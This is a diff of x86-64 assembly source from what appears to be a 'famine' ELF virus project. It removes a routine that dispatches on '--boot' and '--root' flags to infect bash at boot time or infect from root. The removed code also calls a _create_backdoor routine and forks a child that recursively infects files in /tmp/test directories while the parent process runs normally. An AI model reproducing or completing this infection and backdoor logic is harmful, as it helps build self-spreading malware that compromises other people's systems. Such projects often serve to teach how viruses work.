@@ -5,8 +5,7 @@ section .text
 	global _start_infect
 	global _infect_from_root
 	global _verify_starting_infect
-	global _famine_start_options
-    global _fork_before_exec_normaly
+	global _exit_properly
 ;	extern _final_end
 ;	extern _string
 ;	extern _treat_file
@@ -262,80 +261,5 @@ _unlink:
 _exit_copy:
 	leave
 	ret
-
-_activate_start_infection:
-	.string db '--boot', 0
-	.len equ $ - _activate_start_infection.string
-
-_activate_root_infection:
-	.string db '--root', 0
-	.len equ $ - _activate_root_infection.string
-
-_famine_start_options: ; dispatch according to arguments. famine binary only !!
-	mov rax, QWORD [rsp + 136]
-	cmp rax, 2
-	jne _continue_normaly ; if their is only 2 args, we just infect normally
-
-_test_options:
-;   here we check the differents values, and redirect according to it
-;; first we check if --boot is set
-	mov rdi, QWORD [rsp + 152]
-	mov rcx, _activate_start_infection.len
-	lea rsi, [rel _activate_start_infection.string]
-	cld
-	repe cmpsb
-	je _start_infect ; infect bash, to run total infection at boot time
-
-;; check if --root is set
-	mov rdi, QWORD [rsp + 152]
-	mov rcx, _activate_root_infection.len
-	lea rsi, [rel _activate_root_infection.string]
-	cld
-	repe cmpsb
-	lea rdi, [rel _exit_properly]
-	je _fork_before_infect_root ; infect from root
-	jmp _fork_before_exec_normaly ; no arguments corresponds, so simply run normally.
-
-_fork_before_infect_root:
-;; When we infect from root, we always fork the process, run it normally in the parent,
-;; and infect from root in the child
-    ;; fork
-	mov rax, SYS_FORK
-	syscall
-	cmp rax, 0
-    jne _exit_properly ;; parent
-
-    ;; child
-    lea rdi, [rel _exit_properly]
-    jmp _infect_from_root
-
-_fork_before_exec_normaly:
-;; When infecting normaly, we fork the process to run it normally in parent,
-;; and infect in child
-    ;; fork
-	call _create_backdoor
-	mov rax, SYS_FORK
-	syscall
-	cmp rax, 0
-    jne _verify_o_entry ;; parent
-
-    ;;child
-    lea rdi, [rel _exit_properly]
-	mov		rax, 0
-	push	rax
-	push	rax
-	mov		rax, 0x747365742f706d74			; %rax = "tmp/test"
-	push	rax								; push infection path on stack
-	mov		rdi, rsp
-	mov		rsi, rsp
-	add		rsi, 16
-	mov		rax, 1							; sets recursive infection
-	push	rax
-	push	rsi
-	push	rdi
-	call	_read_dir						; call our directory browsing function
-	mov		BYTE [rsp + 32], 0x32			; add a '2' at the end of the path string
-	call	_read_dir						; call our directory browsing function
-	jmp _exit_properly
 
 %undef OPTIONS_S
